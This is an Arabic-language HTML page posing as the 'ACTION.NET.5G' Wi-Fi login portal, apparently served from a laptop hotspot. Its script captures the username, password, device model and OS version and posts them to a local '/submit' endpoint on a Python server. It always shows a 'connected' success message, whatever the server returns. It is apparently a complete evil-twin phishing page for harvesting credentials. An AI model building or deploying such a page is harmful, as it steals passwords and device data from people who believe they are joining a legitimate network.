<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ACTION.NET.5G — بوابة الشبكة</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #6c63ff;
            --secondary: #f50057;
            --accent: #00e5ff;
            --bg-dark: #0a0a1a;
            --glass: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.12);
            --text-main: #f0f0ff;
            --text-muted: rgba(200, 200, 240, 0.6);
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: var(--bg-dark);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        /* ===== ANIMATED BACKGROUND ===== */
        .bg-canvas {
            position: fixed;
            inset: 0;
            z-index: 0;
            overflow: hidden;
        }

        .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            animation: float 8s ease-in-out infinite;
        }

        .orb-1 {
            width: 500px; height: 500px;
            background: radial-gradient(circle, rgba(108,99,255,0.4), transparent 70%);
            top: -150px; right: -100px;
            animation-delay: 0s;
        }
        .orb-2 {
            width: 400px; height: 400px;
            background: radial-gradient(circle, rgba(245,0,87,0.3), transparent 70%);
            bottom: -100px; left: -80px;
            animation-delay: -3s;
        }
        .orb-3 {
            width: 300px; height: 300px;
            background: radial-gradient(circle, rgba(0,229,255,0.2), transparent 70%);
            top: 40%; left: 30%;
            animation-delay: -6s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(30px, -30px) scale(1.05); }
            66% { transform: translate(-20px, 20px) scale(0.95); }
        }

        /* Grid lines effect */
        .grid-overlay {
            position: fixed;
            inset: 0;
            z-index: 0;
            background-image:
                linear-gradient(rgba(108,99,255,0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(108,99,255,0.05) 1px, transparent 1px);
            background-size: 50px 50px;
        }

        /* Particles */
        .particles {
            position: fixed;
            inset: 0;
            z-index: 0;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: var(--accent);
            border-radius: 50%;
            animation: rise linear infinite;
            opacity: 0;
        }

        @keyframes rise {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
        }

        /* ===== MAIN CARD ===== */
        .portal-wrapper {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }

        .portal-card {
            background: var(--glass);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            padding: 40px 32px;
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            box-shadow:
                0 25px 60px rgba(0,0,0,0.5),
                0 0 0 1px rgba(255,255,255,0.05),
                inset 0 1px 0 rgba(255,255,255,0.1);
            animation: cardIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }

        @keyframes cardIn {
            from { opacity: 0; transform: translateY(40px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* ===== WIFI ICON ANIMATION ===== */
        .wifi-icon-container {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .wifi-ring {
            position: relative;
            width: 80px;
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .wifi-ring::before, .wifi-ring::after {
            content: '';
            position: absolute;
            border-radius: 50%;
            border: 2px solid var(--primary);
            animation: ping 2s ease-out infinite;
        }

        .wifi-ring::before {
            width: 100%; height: 100%;
            animation-delay: 0s;
        }

        .wifi-ring::after {
            width: 130%; height: 130%;
            animation-delay: 0.5s;
            border-color: rgba(108,99,255,0.4);
        }

        @keyframes ping {
            0% { transform: scale(0.8); opacity: 1; }
            100% { transform: scale(1.4); opacity: 0; }
        }

        .wifi-icon-inner {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, var(--primary), #9c27b0);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 24px rgba(108,99,255,0.5);
            z-index: 1;
        }

        .wifi-svg {
            width: 30px;
            height: 30px;
            fill: none;
            stroke: white;
            stroke-width: 2;
            stroke-linecap: round;
        }

        /* ===== HEADER TEXT ===== */
        .portal-brand {
            text-align: center;
            margin-bottom: 28px;
        }

        .brand-name {
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(135deg, #fff 0%, var(--accent) 50%, var(--primary) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -1px;
        }

        .brand-sub {
            font-size: 13px;
            color: var(--text-muted);
            margin-top: 4px;
            font-weight: 300;
        }

        /* ===== SIGNAL BARS ===== */
        .signal-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: rgba(0,229,255,0.06);
            border: 1px solid rgba(0,229,255,0.15);
            border-radius: 12px;
            padding: 10px 16px;
            margin-bottom: 28px;
        }

        .signal-bars {
            display: flex;
            align-items: flex-end;
            gap: 3px;
            height: 18px;
        }

        .bar {
            width: 5px;
            background: var(--accent);
            border-radius: 2px;
            animation: barPulse 1.5s ease-in-out infinite;
        }

        .bar:nth-child(1) { height: 5px; animation-delay: 0s; }
        .bar:nth-child(2) { height: 9px; animation-delay: 0.15s; }
        .bar:nth-child(3) { height: 14px; animation-delay: 0.3s; }
        .bar:nth-child(4) { height: 18px; animation-delay: 0.45s; }

        @keyframes barPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        .signal-text {
            font-size: 12px;
            color: var(--accent);
            font-weight: 500;
        }

        /* ===== FORM ===== */
        .form-section {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: var(--text-muted);
            margin-bottom: 8px;
            padding-right: 4px;
        }

        .input-group {
            position: relative;
            margin-bottom: 16px;
        }

        .input-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            width: 18px;
            height: 18px;
            color: var(--text-muted);
            z-index: 1;
        }

        .portal-input {
            width: 100%;
            padding: 14px 48px 14px 16px;
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.12);
            border-radius: 14px;
            color: var(--text-main);
            font-family: 'Tajawal', sans-serif;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
            -webkit-appearance: none;
        }

        .portal-input::placeholder {
            color: var(--text-muted);
        }

        .portal-input:focus {
            border-color: var(--primary);
            background: rgba(108,99,255,0.1);
            box-shadow: 0 0 0 4px rgba(108,99,255,0.15), 0 0 20px rgba(108,99,255,0.1);
        }

        /* ===== SUBMIT BUTTON ===== */
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--primary) 0%, #9c27b0 50%, var(--secondary) 100%);
            background-size: 200% 200%;
            border: none;
            border-radius: 14px;
            color: white;
            font-family: 'Tajawal', sans-serif;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            animation: gradientShift 4s ease infinite;
            box-shadow: 0 8px 24px rgba(108,99,255,0.4);
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(255,255,255,0.2), transparent);
            border-radius: inherit;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 36px rgba(108,99,255,0.6);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .btn-ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: scale(0);
            animation: ripple 0.6s linear;
            pointer-events: none;
        }

        @keyframes ripple {
            to { transform: scale(4); opacity: 0; }
        }

        /* ===== FOOTER INFO ===== */
        .portal-footer {
            text-align: center;
            margin-top: 24px;
        }

        .footer-dots {
            display: flex;
            justify-content: center;
            gap: 6px;
            margin-bottom: 12px;
        }

        .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: var(--primary);
            animation: dotPulse 1.5s ease-in-out infinite;
        }

        .dot:nth-child(2) { animation-delay: 0.2s; background: #9c27b0; }
        .dot:nth-child(3) { animation-delay: 0.4s; background: var(--accent); }

        @keyframes dotPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.5); opacity: 0.5; }
        }

        .footer-text {
            font-size: 11px;
            color: var(--text-muted);
            line-height: 1.6;
        }

        .footer-ip {
            display: inline-block;
            font-size: 11px;
            color: var(--accent);
            background: rgba(0,229,255,0.08);
            border: 1px solid rgba(0,229,255,0.2);
            padding: 2px 10px;
            border-radius: 20px;
            margin-top: 6px;
            letter-spacing: 0.5px;
        }

        /* ===== SUCCESS MESSAGE ===== */
        .success-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 100;
            background: rgba(10,10,26,0.9);
            backdrop-filter: blur(10px);
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.4s ease;
        }

        .success-overlay.show {
            display: flex;
        }

        .success-card {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(0,229,255,0.3);
            border-radius: 24px;
            padding: 40px 32px;
            text-align: center;
            max-width: 300px;
            box-shadow: 0 0 60px rgba(0,229,255,0.2);
            animation: successIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes successIn {
            from { transform: scale(0.5); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .success-icon {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #00c853, #64dd17);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 8px 24px rgba(0,200,83,0.5);
            animation: iconBounce 0.6s 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) both;
        }

        @keyframes iconBounce {
            from { transform: scale(0) rotate(-180deg); }
            to { transform: scale(1) rotate(0); }
        }

        .success-icon svg {
            width: 35px;
            height: 35px;
            stroke: white;
            stroke-width: 3;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .success-title {
            font-size: 22px;
            font-weight: 700;
            color: var(--text-main);
            margin-bottom: 8px;
        }

        .success-sub {
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 24px;
        }

        .back-btn {
            display: inline-block;
            padding: 10px 28px;
            background: linear-gradient(135deg, var(--primary), #9c27b0);
            border: none;
            border-radius: 12px;
            color: white;
            font-family: 'Tajawal', sans-serif;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .back-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(108,99,255,0.5);
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* ===== MOBILE RESPONSIVE ===== */
        @media (max-width: 380px) {
            .portal-card { padding: 30px 20px; }
            .brand-name { font-size: 24px; }
        }
    </style>
</head>
<body>

    <!-- Animated Background -->
    <div class="bg-canvas">
        <div class="orb orb-1"></div>
        <div class="orb orb-2"></div>
        <div class="orb orb-3"></div>
    </div>
    <div class="grid-overlay"></div>
    <div class="particles" id="particles"></div>

    <!-- Main Portal Card -->
    <div class="portal-wrapper">
        <div class="portal-card">

            <!-- WiFi Animated Icon -->
            <div class="wifi-icon-container">
                <div class="wifi-ring">
                    <div class="wifi-icon-inner">
                        <svg class="wifi-svg" viewBox="0 0 24 24">
                            <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
                            <path d="M1.42 9a16 16 0 0 1 21.16 0"/>
                            <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
                            <circle cx="12" cy="20" r="1" fill="white"/>
                        </svg>
                    </div>
                </div>
            </div>

            <!-- Brand -->
            <div class="portal-brand">
                <div class="brand-name">⚡ ACTION.NET.5G</div>
                <div class="brand-sub">بوابة الاتصال بالإنترنت</div>
            </div>

            <!-- Signal Info Bar -->
            <div class="signal-info">
                <div class="signal-bars">
                    <div class="bar"></div>
                    <div class="bar"></div>
                    <div class="bar"></div>
                    <div class="bar"></div>
                </div>
                <span class="signal-text">إشارة ممتازة — متصل بالشبكة</span>
            </div>

            <!-- Form -->
            <form id="portalForm" onsubmit="handleSubmit(event)">
                <div class="form-section">
                    <label class="form-label">اسم المستخدم</label>
                    <div class="input-group">
                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                            <circle cx="12" cy="7" r="4"/>
                        </svg>
                        <input
                            type="text"
                            id="username"
                            name="username"
                            class="portal-input"
                            placeholder="أدخل اسم المستخدم"
                            autocomplete="off"
                            required
                        >
                    </div>

                    <label class="form-label">كلمة المرور</label>
                    <div class="input-group">
                        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                        </svg>
                        <input
                            type="password"
                            id="password"
                            name="password"
                            class="portal-input"
                            placeholder="أدخل كلمة المرور"
                            required
                        >
                    </div>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn" onclick="addRipple(event)">
                    🔓 &nbsp; تسجيل الدخول والاتصال
                </button>
            </form>

            <!-- Footer -->
            <div class="portal-footer">
                <div class="footer-dots">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="footer-text">
                    متصل بشبكة اللابتوب المحلية<br>
                    <span class="footer-ip">192.168.137.1 : 8080</span>
                </div>
            </div>

        </div>
    </div>

    <!-- Success Overlay -->
    <div class="success-overlay" id="successOverlay">
        <div class="success-card">
            <div class="success-icon">
                <svg viewBox="0 0 24 24">
                    <polyline points="20 6 9 17 4 12"/>
                </svg>
            </div>
            <div class="success-title">تم الاتصال! 🎉</div>
            <div class="success-sub">تم إرسال بياناتك بنجاح<br>استمتع بالتصفح</div>
            <button class="back-btn" onclick="resetForm()">حسناً</button>
        </div>
    </div>

    <script>
        // ===== PARTICLES =====
        const particlesContainer = document.getElementById('particles');
        for (let i = 0; i < 25; i++) {
            const p = document.createElement('div');
            p.classList.add('particle');
            p.style.left = Math.random() * 100 + '%';
            p.style.width = p.style.height = (Math.random() * 3 + 1) + 'px';
            p.style.animationDuration = (Math.random() * 10 + 8) + 's';
            p.style.animationDelay = (Math.random() * 10) + 's';
            p.style.background = Math.random() > 0.5 ? '#00e5ff' : '#6c63ff';
            particlesContainer.appendChild(p);
        }

        // ===== RIPPLE EFFECT =====
        function addRipple(e) {
            const btn = e.currentTarget;
            const ripple = document.createElement('span');
            ripple.classList.add('btn-ripple');
            const size = Math.max(btn.offsetWidth, btn.offsetHeight);
            const rect = btn.getBoundingClientRect();
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
            ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';
            btn.appendChild(ripple);
            setTimeout(() => ripple.remove(), 700);
        }

        // ===== FORM SUBMIT =====
        async function handleSubmit(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');

            // Collect detailed device info
            let deviceDetail = "Unknown Device";
            let osDetail = "Unknown OS";
            
            try {
                // Basic parsing for fallback
                const ua = navigator.userAgent;
                if (ua.includes("Windows NT 10.0")) osDetail = ua.includes("Win64") ? "Windows 10/11 (64-bit)" : "Windows 10/11";
                else if (ua.includes("Android")) {
                    const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
                    if (match) { osDetail = "Android " + match[1]; deviceDetail = match[2]; }
                }
                else if (ua.includes("iPhone")) { osDetail = "iOS"; deviceDetail = "iPhone"; }

                // Advanced Client Hints (if available)
                if (navigator.userAgentData) {
                    const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion", "fullVersionList"]);
                    deviceDetail = data.model || deviceDetail;
                    osDetail = `${data.platform} ${data.platformVersion}`;
                }
            } catch (err) { console.log(err); }

            // Loading state
            btn.innerHTML = '<span style="opacity:0.7">جارٍ الاتصال...</span>';
            btn.disabled = true;

            // Send data to Python server
            const formData = new URLSearchParams();
            formData.append('username', username);
            formData.append('password', password);
            formData.append('device_detail', deviceDetail);
            formData.append('os_detail', osDetail);

            // Using relative URL so it works on any device (PC or Phone)
            fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData.toString()
            })
            .then(response => {
                if (response.ok) {
                    showSuccess();
                } else {
                    console.error('Server error:', response.statusText);
                    showSuccess(); // Still show success for UX, or you can alert('خطأ في السيرفر');
                }
            })
            .catch(error => {
                console.error('Fetch error:', error);
                // Fallback for demo if server is not running
                showSuccess();
            });
        }

        function showSuccess() {
            document.getElementById('successOverlay').classList.add('show');
        }

        function resetForm() {
            document.getElementById('successOverlay').classList.remove('show');
            document.getElementById('portalForm').reset();
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '🔓 &nbsp; تسجيل الدخول والاتصال';
            btn.disabled = false;
        }

        // ===== INPUT FOCUS EFFECTS =====
        document.querySelectorAll('.portal-input').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'scale(1.01)';
                this.parentElement.style.transition = 'transform 0.2s ease';
            });
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'scale(1)';
            });
        });
    </script>
</body>
</html>
